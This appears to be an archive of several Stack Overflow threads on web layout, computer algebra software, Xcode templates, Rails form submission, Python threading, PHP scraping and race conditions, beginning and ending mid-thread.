<pre class=""lang-css prettyprint-override""><code>div {
  position: absolute;
  top: 300px;
  bottom: 0px;
  left: 30px;
  right: 30px;
}
</code></pre>

<p>This will put the DIV 30px in from each side, 300px from the top of the screen, and flush with the bottom.  Add an <code>overflow:auto;</code> to handle cases where the content is larger than the div.
<hr/>
Edit: @Whoever marked this down, an explanation would be nice... Is something wrong with the answer?</p>
 <p>The DIV houses a control that does it's own overflow handling.</p>
 <p>If I understand what you're asking, this should do the trick:</p>

<pre><code>// the more standards compliant browsers (mozilla/netscape/opera/IE7) use 
// window.innerWidth and window.innerHeight

var windowHeight;

if (typeof window.innerWidth != 'undefined')
{
    windowHeight = window.innerHeight;
}
// IE6 in standards compliant mode (i.e. with a valid doctype as the first 
// line in the document)
else if (typeof document.documentElement != 'undefined'
        &amp;&amp; typeof document.documentElement.clientWidth != 'undefined' 
        &amp;&amp; document.documentElement.clientWidth != 0)
{
    windowHeight = document.documentElement.clientHeight;
}
// older versions of IE
else
{
    windowHeight = document.getElementsByTagName('body')[0].clientHeight;
}

document.getElementById(""yourDiv"").height = windowHeight - 300 + ""px"";
</code></pre>
 <p><code>document.getElementById('myDiv').style.height = 500;</code></p>

<p>This is the very basic JS code required to adjust the height of your object dynamically.  I just did this very thing where I had some auto height property, but when I add some content via <code>XMLHttpRequest</code> I needed to resize my parent div and this offsetheight property did the trick in IE6/7 and FF3</p>
 <blockquote>
  <p>@17 of 26 I used to have a solution like this - I found that it ran into weird issues with ie 6.0 sometimes being off by a few pixels, which really made the layout look odd.</p>
</blockquote>

<p>Yeah, in my solution I just wound up shrinking the height by an arbitrary number of pixels for IE.</p>

<p>I could not find any other way to dynamically size a div though.  A lot of my layout uses tables since they handle dynamically sized content automatically.</p>

<p>Cross-browser web design just plain sucks :P.</p>
 <p>Try this simple, specific function:</p>

<pre><code>function resizeElementHeight(element) {
  var height = 0;
  var body = window.document.body;
  if (window.innerHeight) {
      height = window.innerHeight;
  } else if (body.parentElement.clientHeight) {
      height = body.parentElement.clientHeight;
  } else if (body &amp;&amp; body.clientHeight) {
      height = body.clientHeight;
  }
  element.style.height = ((height - element.offsetTop) + ""px"");
}
</code></pre>

<p>It does not depend on the current distance from the top of the body being specified (in case your 300px changes).</p>

<p><hr /></p>

<p>EDIT: By the way, you would want to call this on that div every time the user changed the browser's size, so you would need to wire up the event handler for that, of course.</p>
 <p>With minor corrections:</p>

<pre><code>function rearrange()
{
var windowHeight;

if (typeof window.innerWidth != 'undefined')
{
	windowHeight = window.innerHeight;
}
// IE6 in standards compliant mode (i.e. with a valid doctype as the first
// line in the document)
else if (typeof document.documentElement != 'undefined'
		&amp;&amp; typeof document.documentElement.clientWidth != 'undefined'
		&amp;&amp; document.documentElement.clientWidth != 0)
{
	windowHeight = document.documentElement.clientHeight;
}
// older versions of IE
else
{
	windowHeight = document.getElementsByTagName('body')[0].clientHeight;
}

document.getElementById(""foobar"").style.height = (windowHeight - document.getElementById(""foobar"").offsetTop  - 6)+ ""px"";
}
</code></pre>
 <p>Simplest I could come up...</p>

<pre><code>function resizeResizeableHeight() {
    $('.resizableHeight').each( function() {
        $(this).outerHeight( $(this).parent().height() - ( $(this).offset().top - ( $(this).parent().offset().top + parseInt( $(this).parent().css('padding-top') ) ) ) )
    });
}
</code></pre>

<p>Now all you have to do is add the resizableHeight class to everything you want to autosize (to it's parent).</p>
"
"Best open-source Mathematica equivalent <p>What is the best open-source equivalent for Mathematica?  My requirements are:</p>

<ol>
<li>(most important) Must be a real computer algebra system (CAS).  Notably, I don't want Matlab clones -- I want something that can, at least, symbolically differentiate and integrate.</li>
<li>Must be programmable.  A functional-programming view of the world, like Mathematica's, would be awesome.  The basic datatype of M'ica is the list, which is very convenient!</li>
<li>(least important) Similar syntax would be nice.</li>
</ol>

<p>The ability to deal with objects such as groups or graphs would be a great bonus, but my primary emphasis is on the main things Mathematica and Maple do: algebra and calculus, both symbolic and numeric.  Also, plotting is not high on my list of requirements, as I'm mostly a terminal and not GUI user.</p>
 <p><a href=""http://en.wikipedia.org/wiki/Comparison_of_computer_algebra_systems"" rel=""nofollow"">http://en.wikipedia.org/wiki/Comparison_of_computer_algebra_systems</a></p>
 <p>Have you seen <a href=""http://www.sagemath.org"">Sage</a>? </p>

<p>It provides a great terminal/gui interface and is extend able to tons of application's. It also has great support for programming, utilizing python.  </p>

<p>I would be very surprised if it didn't do what you needed. </p>

<p>Brian</p>
 <p>Try <a href=""http://maxima.sourceforge.net/"">Maxima</a>.  It is a ""real CAS"" (can do symbolic stuff).  Programmability emphasizes imperative, but you can do functional too.  Not fast, however.  Precompiled Windows version is available.</p>
 <p>Specifically, Maxima:</p>

<p><a href=""http://en.wikipedia.org/wiki/Maxima_%28software%29"">http://en.wikipedia.org/wiki/Maxima_%28software%29</a></p>
 <p>There's also a C++ library CAS called <a href=""http://www.ginac.de/"">GiNaC</a>.  This isn't exactly what you were looking for but it's certainly very programmable.</p>
 <p>The SAS guys at work have mentioned <a href=""http://www.r-project.org/"" rel=""nofollow"">R</a>.</p>
 <p>SAGE is definitely one you should consider since it actually includes the full version of Maxima within it (along with interfaces to various other mathematical packages).  To answer your questions:</p>

<p>1) SAGE can symbolically <a href=""http://www.sagemath.org/doc/tutorial/tour_algebra.html#differentiation-integration-etc"">differentiate and integrate</a>.</p>

<p>2) Programming in SAGE is done via Python.</p>

<p>3) The syntax is rather different to Mathematica's (which is essentially LISP-like) but here is a blog post written by a heavy user of Mathematica so you can see what he thinks: <a href=""http://www.walkingrandomly.com/?p=103"">Walking Randomly: Interacting with SAGE</a></p>
 <p>Hm, I may be a bit late, but Sage uses Maxima for symbolic calculation. 
Sage is far bigger than Maxima then :)
So if your tasks are simple, you can choose Maxima, it has good GUIs (xMaxima/wxMaxima) and CLI (iMaxima mode for Emacs is cool!), and it can do plotting with Gnuplot.</p>
 <p>after SAGE try PARI/GP and then MAGMA</p>
 <p>If you decide to use Maxima (recommended!), you might find the following introduction and collection of resources helpful:</p>

<p><a href=""http://mathscitech.org/articles/maxima"" rel=""nofollow"">Resources: Maxima for Symbolic Computation:</a> ( <a href=""http://mathscitech.org/articles/maxima"" rel=""nofollow"">http://mathscitech.org/articles/maxima</a> ),</p>

<p>which includes among its listings a nifty <a href=""http://www.math.harvard.edu/computing/maxima/"" rel=""nofollow"">Mathematics / Maxima Syntax Conversion sheet</a>.</p>
 <p>My <a href=""http://bitbucket.org/axelclk/symja_android_library/wiki/Home"" rel=""nofollow"">Symja project</a> implements similar functions in Java. </p>
 <h2><a href=""http://sympy.org/"">SymPy</a></h2>

<p>Open source, Python</p>

<hr>

<p>SymPy is a Python library for symbolic mathematics. It aims to become a full-featured computer algebra system (CAS) while keeping the code as simple as possible in order to be comprehensible and easily extensible. SymPy is written entirely in Python and does not require any external libraries.</p>
 <p><a href=""//mathics.github.io/"" rel=""nofollow"">Mathics</a> is essentially an open-source mathematica clone, with back-end SymPy and Sage!</p>

<p>Moreover, you can try it <a href=""//mathics.github.io/"" rel=""nofollow"">online</a>, with a mathematica-like Notebook interface (although it doesn't have all mathematica's capabilities yet, but already feels like it). It supports saving and loading notebooks from the browser as well.</p>

<p>Interestingly, it doesn't have mathematica's Function <a href=""//weaklyreachable.blogspot.com/2007/06/mathematica-pure-function-scope-problem_2182.html"" rel=""nofollow"">problem</a>!</p>
 <p>you may want to check out this online CAS:</p>

<p><a href=""http://www.vroomlab.com"" rel=""nofollow"">http://www.vroomlab.com</a></p>

<p>a quick reference is at:</p>

<p><a href=""http://www.vroomlab.com/nhome/qr.jsp"" rel=""nofollow"">http://www.vroomlab.com/nhome/qr.jsp</a></p>
"
"Change templates in Xcode <p>How would I change the initial templates created by Xcode when creating a new Cocoa Class.</p>

<p>I am referring to the comments and class name created when using Xcode's new class wizard.</p>
 <p>You wouldn't change the existing templates.  In other words, don't <em>modify</em> anything under the <code>/Developer</code> hierarchy (or wherever you installed your developer tools).</p>

<p>Instead, clone the templates you want to have customized variants of.  Then change their names and the information in them.  Finally, put them in the appropriate location in your account's <code>Library/Application Support</code> folder, specifically:</p>

<ul>
<li>File templates: <code>~/Library/Application Support/Developer/Shared/Xcode/File Templates/</code></li>
<li>Target templates: <code>~/Library/Application Support/Developer/Shared/Xcode/Target Templates/</code></li>
<li>Project templates: <code>~/Library/Application Support/Developer/Shared/Xcode/Project Templates/</code></li>
</ul>

<p>That way they won't be overwritten when you install new developer tools, and you can tweak them to your heart's content.</p>
 <p>Xcode uses template files for file and project templates and does variable expansion in both at creation time.</p>

<p>Xcode 3.0 templates can be found in [Dev Installation]/Library/Xcode/, likely /Developer/Library/Xcode. If you want to modify these templates or add your own, use the following directories to save your new/modified templates so that they are not wiped out by future Developer Tool upgrades:</p>

<ul>
<li>File templates:
~/Library/Developer/Shared/Xcode/File
Templates/ </li>
<li>Target templates:
~/Library/Developer/Shared/Xcode/Target
Templates/ </li>
<li>Project templates:
~/Library/Developer/Shared/Xcode/Project
Templates/</li>
</ul>

<p>I think that you can also use the /Library/Developer/Shared/Xcode/[File|Target|Project] Templates/ directory for templates shared by all users.</p>

<p>If you just want to change the <strong>MyCompanyName</strong> in the templates, the following command line will do the trick:</p>

<pre><code>defaults write com.apple.Xcode PBXCustomTemplateMacroDefinitions '{ ""ORGANIZATIONNAME"" = ""NewCompanyName"";}'
</code></pre>

<p>A  good tutorial on writing file templates is <a href=""http://www.macresearch.org/custom_xcode_templates"">here</a> [MacResearch.org].</p>
 <p>In Xcode 4 and Xcode 5 the <strong>user</strong> file templates can be placed at:<br/>
<code>~/Library/Developer/Xcode/Templates/[Category]</code></p>

<p>[Category] can be used to categorize your templates (choose a name of your choise)</p>

<p>If the folder doesn't exist already, create it!</p>
 <p>For Xcode 4.4, none of the previously mentioned methods work. <a href=""https://gist.github.com/3513608"" rel=""nofollow"">This gist</a> provides a partial hacky solution. Please fork and enhance if you know a better way.</p>
 <p>In XCode 4.5 right click on project, click Show File Inspector, then change Organization name in the file inspector's second tab (Project Document group)</p>
 <p>In xcode 5.0.1:</p>

<p>1.Go->Applications</p>

<p>2.right click ""xcode"" application</p>

<p>3.chose ""Show Package Contents""</p>

<p>4.contents/Developer/Library/Xcode/Templates</p>
 <p>Right click on xCode and select <strong>Show Package contents</strong>, then go to <code>contents/Developer/Library/Xcode/Templates</code>. Here you can find the templates for all programming languages.</p>

<p>Here some visualization:</p>

<hr>

<p><img src=""http://i.stack.imgur.com/Po1Tv.png"" alt=""enter image description here""></p>

<hr>

<p><img src=""http://i.stack.imgur.com/7JpP9.png"" alt=""enter image description here""></p>
 <p>This may be useful for somebody:</p>

<p>As for <strong>XCode 6</strong> and <strong>XCode 7</strong> the file templates are in:</p>

<pre><code>/Applications/Xcode.app/Contents/Developer/Library/Xcode/Templates/File Templates/Source
</code></pre>

<p><strong>Update:</strong>
As @carbo18 noted, it's proably better to create the directory <code>~/Library/Developer/Xcode/Templates/File Templates/Source</code> and put your custom templates there. The best way may be to use as base one of the ones in <code>/Applications/Xcode.app/Contents/Developer/Library/Xcode/Templates/File Templates/Source</code></p>
 <p>As of Xcode 7</p>

<ul>
<li>File templates: <code>~/Library/Developer/Xcode/Templates/File Templates</code> </li>
<li>Project templates: <code>~/Library/Developer/Xcode/Templates/Project Templates</code></li>
</ul>

<p>For example if I place a <code>Empty Application.xctemplate</code> in <code>~/Library/Developer/Xcode/Templates/Project Templates/Application</code></p>

<p>It will appear in the template dialog as
<a href=""http://i.stack.imgur.com/n4XPj.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/n4XPj.png"" alt=""Template Dialog""></a></p>
"
"Is it possible to call Javascript's onsubmit event programatically on a form? <p>In Ruby on Rails, I'm attempting to update the <code>innerHTML</code> of a div tag using the <code>form_remote_tag</code> helper.  This update happens whenever an associated select tag receives an onchange event.  The problem is, <code>&lt;select onchange=""this.form.submit();""&gt;</code>; doesn't work.  Nor does <code>document.forms[0].submit()</code>.  The only way to get the onsubmit code generated in the form_remote_tag to execute is to create a hidden submit button, and invoke the click method on the button from the select tag.  Here's a working ERb partial example.</p>

<pre><code>&lt;% form_remote_tag :url =&gt; product_path, :update =&gt; 'content', :method =&gt; 'get' do -%&gt;
  &lt;% content_tag :div, :id =&gt; 'content' do -%&gt;
    &lt;%= select_tag :update, options_for_select([[""foo"", 1], [""bar"", 2]]), :onchange =&gt; ""this.form.commit.click"" %&gt;
    &lt;%= submit_tag 'submit_button', :style =&gt; ""display: none"" %&gt;
  &lt;% end %&gt;
&lt;% end %&gt;
</code></pre>

<p>What I want to do is something like this, but it doesn't work.</p>

<pre><code>&lt;% form_remote_tag :url =&gt; product_path, :update =&gt; 'content', :method =&gt; 'get' do -%&gt;
  &lt;% content_tag :div, :id =&gt; 'content' do -%&gt;
    # the following line does not work
    &lt;%= select_tag :update, options_for_select([[""foo"", 1], [""bar"", 2]]), :onchange =&gt; ""this.form.onsubmit()"" %&gt;
  &lt;% end %&gt;
&lt;% end %&gt;
</code></pre>

<p>So, is there any way to remove the invisible submit button for this use case?</p>

<p>There seems to be some confusion.  So, let me explain.  The basic problem is that <code>submit()</code> doesn't call the <code>onsubmit()</code> code rendered into the form.</p>

<p>The actual HTML form that Rails renders from this ERb looks like this:</p>

<pre><code>&lt;form action=""/products/1"" method=""post"" onsubmit=""new Ajax.Updater('content', '/products/1', {asynchronous:true, evalScripts:true, method:'get', parameters:Form.serialize(this)}); return false;""&gt;
  &lt;div style=""margin:0;padding:0""&gt;
    &lt;input name=""authenticity_token"" type=""hidden"" value=""4eacf78eb87e9262a0b631a8a6e417e9a5957cab"" /&gt;
  &lt;/div&gt;
  &lt;div id=""content""&gt;
    &lt;select id=""update"" name=""update"" onchange=""this.form.commit.click""&gt;
      &lt;option value=""1""&gt;foo&lt;/option&gt;
      &lt;option value=""2""&gt;bar&lt;/option&gt;
    &lt;/select&gt;
    &lt;input name=""commit"" style=""display: none"" type=""submit"" value=""submit_button"" /&gt;
  &lt;/div&gt;
&lt;/form&gt;
</code></pre>

<p>I want to axe the invisible submit button, but using a straight form.submit appears to not work.  So, I need some way to call the form's onsubmit event code.</p>

<p>Update: Orion Edwards solution would work if there wasn't a <code>return(false);</code> generated by Rails.  I'm not sure which is worse though, sending a phantom click to an invisible submit button or calling eval on the <code>getAttribute('onsubmit')</code> call after removing the return call with a javascript string replacement!   </p>
 <p>give your form an <code>id</code>.</p>

<p>then</p>

<pre><code>document.getElementById('formid').submit();
</code></pre>

<p>If you are loading Javascript into a <code>div</code> via <code>innerHTML</code>, it won't run...just FYI.</p>
 <p>If you didn't actually want to submit the form, but just invoke whatever code happened to be in the onsubmit, you could possibly do this: (untested)</p>

<pre><code>var code = document.getElementById('formId').getAttribute('onsubmit');
eval(code);
</code></pre>
 <p>If you have to use Rail's built-in Javascript generation, I would use Orion's solution, but with one small alteration to compensate for the return code.</p>

<pre><code>eval ('(function(){' + code + '})()');
</code></pre>

<p>However, in my opinion you'd have an easier time in the long run by separating out the Javascript code into an external file or separate callable functions.</p>
 <p>In theory, something like <code>eval ('function(){' + code + '}()');</code> could work (that syntax fails though).  Even if that did work, it would still be sort of ghetto to be calling an eval through a select <code>onchange</code>.  Another solution would be to somehow get Rails to inject the <code>onsubmit</code> code into the <code>onchange</code> field of the select tag, but I'm not sure if there's a way to do that.  ActionView has link_to_remote, but there's no obvious helper to generate the same code in the <code>onchange</code> field.</p>
 <p>Don't.</p>

<p>You have a solution.</p>

<p>Stop, move on to the next function point.</p>

<p>I know, it is not pretty, but there are bigger problems.</p>
 <p>Not sure if you have an answer yet or not, but in the <code>onclick</code> function of the select, call <code>onsubmit</code> instead of <code>submit</code>.</p>
 <p>I realize this question is kind of old, but what the heck are you doing eval for?</p>

<pre><code>document.getElementById('formId').onsubmit();
document.getElementById('formId').submit();
</code></pre>

<p>or</p>

<pre><code>document.formName.onsubmit();
document.formName.submit();
</code></pre>

<p>When the DOM of a document is loaded, the events are not strings any more, they are functions.</p>

<pre><code>alert(typeof document.formName.onsubmit); // function
</code></pre>

<p>So there's no reason to convert a function to a string just so you can eval it.</p>
"
"Are Python threads buggy? <p>A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether.  What can said about this rumor?</p>
 <p>I've used it in several applications and have never had nor heard of threading being anything other than 100% reliable, as long as you know its limits.  You can't spawn 1000 threads at the same time and expect your program to run properly on Windows, however you can easily write a worker pool and just feed it 1000 operations, and keep everything nice and under control.</p>
 <p>As far as I know there are no real bugs, but the performance when threading in cPython is really bad (compared to most other threading implementations, but usually good enough if all most of the threads do is block) due to the <a href=""http://docs.python.org/api/threads.html"" rel=""nofollow"">GIL</a> (Global Interpreter Lock), so really it is implementation specific rather than language specific. Jython, for example, does not suffer from this due to using the Java thread model.</p>

<p>See <a href=""http://www.artima.com/weblogs/viewpost.jsp?thread=214235"" rel=""nofollow"">this</a> post on why it is not really feasible to remove the GIL from the cPython implementation, and <a href=""http://www.pyzine.com/Issue001/Section_Articles/article_ThreadingGlobalInterpreter.html"" rel=""nofollow"">this</a> for some practical elaboration and workarounds.</p>

<p>Do a quick google for <a href=""http://www.google.com/search?q=python+gil"" rel=""nofollow"">""Python GIL""</a> for more information.</p>
 <p>Python threads are good for <strong>concurrent I/O programming</strong>. Threads are swapped out of the CPU as soon as they block waiting for input from file, network, etc. This allows other Python threads to use the CPU while others wait. This would allow you to write a multi-threaded web server or web crawler, for example.</p>

<p>However, Python threads are serialized by the <a href=""http://en.wikipedia.org/wiki/Global_Interpreter_Lock"">GIL</a> when they enter interpreter core. This means that if two threads are crunching numbers, only one can run at any given moment. It also means that you can't take advantage of multi-core or multi-processor architectures.</p>

<p>There are solutions like running multiple Python interpreters concurrently, using a C based threading library. This is not for the faint of heart and the benefits might not be worth the trouble. Let's hope for an all Python solution in a future release.</p>
 <p>The GIL (Global Interpreter Lock) might be a problem, but the API is quite OK. Try out the excellent <code>processing</code> module, which implements the Threading API for separate processes. I am using that right now (albeit on OS X, have yet to do some testing on Windows) and am really impressed. The Queue class is really saving my bacon in terms of managing complexity!</p>

<p><strong>EDIT</strong>: it seemes the processing module is being included in the standard library as of version 2.6 (<code>import multiprocessing</code>). Joy!</p>
 <p>The standard implementation of Python (generally known as CPython as it is written in C) uses OS threads, but since there is the <a href=""http://en.wikipedia.org/wiki/Global_Interpreter_Lock"" rel=""nofollow"">Global Interpreter Lock</a>, only one thread at a time is allowed to run Python code.  But within those limitations, the threading libraries are robust and widely used.</p>

<p>If you want to be able to use multiple CPU cores, there are a few options.  One is to use multiple python interpreters concurrently, as mentioned by others.  Another option is to use a different implementation of Python that does not use a GIL.  The two main options are <a href=""http://en.wikipedia.org/wiki/Jython"" rel=""nofollow"">Jython</a> and <a href=""http://en.wikipedia.org/wiki/IronPython"" rel=""nofollow"">IronPython</a>.</p>

<p>Jython is written in Java, and is now fairly mature, though some incompatibilities remain.  For example, the web framework <a href=""http://zyasoft.com/pythoneering/2008/01/django-on-jython-minding-gap.html"" rel=""nofollow"">Django does not run perfectly yet</a>, but is getting closer all the time.  Jython is <a href=""http://mail.python.org/pipermail/python-list/2001-December/116555.html"" rel=""nofollow"">great for thread safety</a>, comes out <a href=""http://blogs.warwick.ac.uk/dwatkins/entry/benchmarking_parallel_python_1_2/"" rel=""nofollow"">better in benchmarks</a> and has a <a href=""http://cgwalters.livejournal.com/17956.html"" rel=""nofollow"">cheeky message for those wanting the GIL</a>.</p>

<p>IronPython uses the .NET framework and is written in C#.  Compatibility is reaching the stage where <a href=""http://www.infoq.com/news/2008/03/django-and-ironpython"" rel=""nofollow"">Django can run on IronPython</a> (at least as a demo) and there are <a href=""http://www.voidspace.org.uk/ironpython/threading.shtml"" rel=""nofollow"">guides to using threads in IronPython</a>.</p>
 <p>If you want to code in python and get great threading support, you might want to check out IronPython or Jython. Since the python code in IronPython and Jython run on the .NET CLR and Java VM respectively, they enjoy the great threading support built into those libraries. In addition to that, IronPython doesn't have the GIL, an issue that prevents CPython threads from taking full advantage of multi-core architectures.</p>
"
"HTML Scraping in Php <p>I've been doing some html scraping in PHP using regular expressions.  This works, but the result is finicky and fragile.  Has anyone used any packages that provide a more robust solution?  A config driven solution would be ideal, but I'm not picky.</p>
 <p>I would recomend <a href=""https://sourceforge.net/projects/simplehtmldom/"">PHP Simple HTML DOM Parser</a> after you have scraped the HTML from the page. It supports invalid HTML, and provides a very easy way to handle HTML elements. </p>
 <p>If the page you're scraping is valid X(HT)ML, then any of <a href=""http://www.php.net/manual/en/refs.xml.php"">PHP's built-in XML parsers</a> will do. </p>

<p>I haven't had much success with PHP libraries for scraping. If you're adventurous though, you can try <a href=""https://sourceforge.net/projects/simplehtmldom/"">simplehtmldom</a>. I'd recommend <a href=""http://code.whytheluckystiff.net/hpricot/"">Hpricot</a> for Ruby or <a href=""http://www.crummy.com/software/BeautifulSoup/"">Beautiful Soup</a> for Python, which are both <em>excellent</em> parsers for HTML.</p>
 <p>I've had very good with results with the <a href=""https://sourceforge.net/projects/simplehtmldom/"" rel=""nofollow"">Simple Html DOM Parser</a> mentioned above as well. And then there's the  <a href=""http://www.php.net/tidy"" rel=""nofollow"">tidy Extension for PHP</a> as well which works really well too.</p>
 <p>I had some fun working with <a href=""https://github.com/hxseven/htmlSQL"" rel=""nofollow"">htmlSQL</a>, which is not so much a high end solution, but really simple to work with.</p>
 <p>Using PHP for HTML scraping, I'd recommend cURL + regexp or cURL + some DOM parsers though I personally use cURL + regexp. If you have a profound taste of regexp, it's actually more accurate sometimes.</p>
 <p>I would also recommend 'Simple HTML DOM Parser.' It is a good option particularly if your familiar with jQuery or JavaScript selectors then you will find yourself at home.</p>

<p><a href=""http://blog.dougalmatthews.com/2008/08/html-dom-and-easy-screen-scraping-in-php/"">I have even blogged about it in the past.</a></p>
 <p>I had to use curl on my host 1and1.</p>

<p><a href=""http://www.quickscrape.com/"" rel=""nofollow"">http://www.quickscrape.com/</a> is what I came up with using the Simple DOM class!</p>
"
"What is a race condition? <p>When writing multi-threaded applications, one of the most common problems experienced are race conditions.  </p>

<p>My questions to the community are:</p>

<p>What is a race condition? How do you detect them? How do you handle them? Finally, how do you prevent them from occurring?</p>
 <p>A race condition is a kind of bug, that happens only with certain temporal conditions.</p>

<p>Example:
Imagine you have two threads, A and B.</p>

<p>In Thread A:</p>

<pre class=""lang-c prettyprint-override""><code>if( object.a != 0 )
    object.avg = total / object.a
</code></pre>

<p>In Thread B:</p>

<pre class=""lang-c prettyprint-override""><code>object.a = 0
</code></pre>

<p>If thread A is preempted just after having check that object.a is not null, B will do <code>a = 0</code>, and when thread A will gain the processor, it will do a ""divide by zero"". </p>

<p>This bug only happen when thread A is preempted just after the if statement, it's very rare, but it can happen.</p>
 <p>A race condition occurs when two or more threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don't know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are ""racing"" to access/change the data. </p>

<p>Problems often occur when one thread does a ""check-then-act"" (e.g. ""check"" if the value is X, then ""act"" to do something that depends on the value being X) and another thread does something to the value in between the ""check"" and the ""act"". E.g:</p>

<pre><code>if (x == 5) // The ""Check""
{
   y = x * 2; // The ""Act""

   // If another thread changed x in between ""if (x == 5)"" and ""y = x * 2"" above,
   // y will not be equal to 10.
}
</code></pre>

<p>The point being, y could be 10, or it could be anything, depending on whether another thread changed x in between the check and act. You have no real way of knowing.</p>

<p>In order to prevent race conditions from occurring, you would typically put a lock around the shared data to ensure only one thread can access the data at a time. This would mean something like this:</p>

<pre><code>// Obtain lock for x
if (x == 5)
{
   y = x * 2; // Now, nothing can change x until the lock is released. 
              // Therefore y = 10
}
// release lock for x
</code></pre>
 <p>A race condition is a situation on concurrent programming where two concurrent threads or processes and the resulting final state depends on who gets the resource first.</p>
 <p>Race conditions occur in multi-threaded applications or multi-process systems.  A race condition, at its most basic, is anything that makes the assumption that two things not in the same thread or process will happen in a particular order, without taking steps to ensure that they do.  This happens commonly when two threads are passing messages by setting and checking member variables of a class both can access.  There's almost always a race condition when one thread calls sleep to give another thread time to finish a task (unless that sleep is in a loop, with some checking mechanism).</p>

<p>Tools for preventing race conditions are dependent on the language and OS, but some comon ones are mutexes, critical sections, and signals.  Mutexes are good when you want to make sure you're the only one doing something.  Signals are good when you want to make sure someone else has finished doing something.  Minimizing shared resources can also help prevent unexpected behaviors</p>

<p>Detecting race conditions can be difficult, but there are a couple signs.  Code which relies heavily on sleeps is prone to race conditions, so first check for calls to sleep in the affected code.  Adding particularly long sleeps can also be used for debugging to try and force a particular order of events.  This can be useful for reproducing the behavior, seeing if you can make it disappear by changing the timing of things, and for testing solutions put in place.  The sleeps should be removed after debugging.</p>

<p>The signature sign that one has a race condition though, is if there's an issue that only occurs intermittently on some machines.  Common bugs would be crashes and deadlocks.  With logging, you should be able to find the affected area and work back from there.</p>
 <p>A sort-of-canonical definition is ""<em>when two threads access the same location in memory at the same time, and at least one of the accesses is a write</em>."" In the situation the ""reader"" thread may get the old value or the new value, depending on which thread ""wins the race."" This is not always a bug&mdash;in fact, some really hairy low-level algorithms do this on purpose&mdash;but it should generally be avoided. @Steve Gury give's a good example of when it might be a problem.</p>
 <p>A ""race condition"" exists when multithreaded (or otherwise parallel) code that would access a shared resource could do so in such a way as to cause unexpected results.</p>

<p>Take this example:</p>

<pre class=""lang-c prettyprint-override""><code>for ( int i = 0; i &lt; 10000000; i++ )
{
   x = x + 1; 
}
</code></pre>

<p>If you had 5 threads executing this code at once, the value of x WOULD NOT end up being 50,000,000.  It would in fact vary with each run.</p>

<p>This is because, in order for each thread to increment the value of x, they have to do the following: (simplified, obviously)</p>

<pre>
Retrieve the value of x
Add 1 to this value
Store this value to x
</pre>

<p>Any thread can be at any step in this process at any time, and they can step on each other when a shared resource is involved.  The state of x can be changed by another thread during the time between x is being read and when it is written back.</p>

<p>Let's say a thread retrieves the value of x, but hasn't stored it yet.  Another thread can also retrieve the <b>same</b> value of x (because no thread has changed it yet) and then they would both be storing the <b>same</b> value (x+1) back in x!</p>

<p>Example:</p>

<pre>
Thread 1: reads x, value is 7
Thread 1: add 1 to x, value is now 8
Thread 2: reads x, <b>value is 7</b>
Thread 1: stores 8 in x
Thread 2: adds 1 to x, value is now 8
Thread 2: <b>stores 8 in x</b>
</pre>

<p>Race conditions can be avoided by employing some sort of <b>locking</b> mechanism before the code that accesses the shared resource:</p>

<pre class=""lang-c prettyprint-override""><code>for ( int i = 0; i &lt; 10000000; i++ )
{
   //lock x
   x = x + 1; 
   //unlock x
}
</code></pre>

<p>Here, the answer comes out as 50,000,000 every time.</p>

<p>For more on locking, search for: mutex, semaphore, critical section, shared resource.</p>
 <p>Here is the classical Bank Account Balance example which will help newbies to understand Threads in Java easily w.r.t. race conditions:</p>

<pre class=""lang-java prettyprint-override""><code>public class BankAccount {

/**
 * @param args
 */
int accountNumber;
double accountBalance;

public synchronized boolean Deposit(double amount){
    double newAccountBalance=0;
    if(amount&lt;=0){
        return false;
    }
    else {
        newAccountBalance = accountBalance+amount;
        accountBalance=newAccountBalance;
        return true;
    }

}
public synchronized boolean Withdraw(double amount){
    double newAccountBalance=0;
    if(amount&gt;accountBalance){
        return false;
    }
    else{
        newAccountBalance = accountBalance-amount;
        accountBalance=newAccountBalance;
        return true;
    }
}

public static void main(String[] args) {
    // TODO Auto-generated method stub
    BankAccount b = new BankAccount();
    b.accountBalance=2000;
    System.out.println(b.Withdraw(3000));

}
</code></pre>
 <p>A race condition is an undesirable situation that occurs when a device or system attempts to perform two or more operations at the same time, but because of the nature of the device or system, the operations must be done in the proper sequence in order to be done correctly.</p>

<p>In computer memory or storage, a race condition may occur if commands to read and write a large amount of data are received at almost the same instant, and the machine attempts to overwrite some or all of the old data while that old data is still being read. The result may be one or more of the following: a computer crash, an ""illegal operation,"" notification and shutdown of the program, errors reading the old data, or errors writing the new data.</p>
 <p>Microsoft actually have published a really detailed <a href=""http://support.microsoft.com/kb/317723"">article</a> on this matter of race conditions and deadlocks. The most summarized abstract from it would be the title paragraph:</p>

<blockquote>
  <p>A race condition occurs when two threads access a shared variable at
  the same time. The first thread reads the variable, and the second
  thread reads the same value from the variable. Then the first thread
  and second thread perform their operations on the value, and they race
  to see which thread can write the value last to the shared variable.
  The value of the thread that writes its value last is preserved,
  because the thread is writing over the value that the previous thread
  wrote.</p>
</blockquote>
 <p>Try this basic example for better understanding of race condition:</p>

<pre><code>    public class ThreadRaceCondition {

    /**
     * @param args
     * @throws InterruptedException
     */
    public static void main(String[] args) throws InterruptedException {
        Account myAccount = new Account(22222222);

        // Expected deposit: 250
        for (int i = 0; i &lt; 50; i++) {
            Transaction t = new Transaction(myAccount,
                    Transaction.TransactionType.DEPOSIT, 5.00);
            t.start();
        }

        // Expected withdrawal: 50
        for (int i = 0; i &lt; 50; i++) {
            Transaction t = new Transaction(myAccount,
                    Transaction.TransactionType.WITHDRAW, 1.00);
            t.start();

        }

        // Temporary sleep to ensure all threads are completed. Don't use in
        // realworld :-)
        Thread.sleep(1000);
        // Expected account balance is 200
        System.out.println(""Final Account Balance: ""
                + myAccount.getAccountBalance());

    }

}

class Transaction extends Thread {

    public static enum TransactionType {
        DEPOSIT(1), WITHDRAW(2);

        private int value;

        private TransactionType(int value) {
            this.value = value;
        }

        public int getValue() {
            return value;
        }
    };

    private TransactionType transactionType;
    private Account account;
    private double amount;

    /*
     * If transactionType == 1, deposit else if transactionType == 2 withdraw
     */
    public Transaction(Account account, TransactionType transactionType,
            double amount) {
        this.transactionType = transactionType;
        this.account = account;
        this.amount = amount;
    }

    public void run() {
        switch (this.transactionType) {
        case DEPOSIT:
            deposit();
            printBalance();
            break;
        case WITHDRAW:
            withdraw();
            printBalance();
            break;
        default:
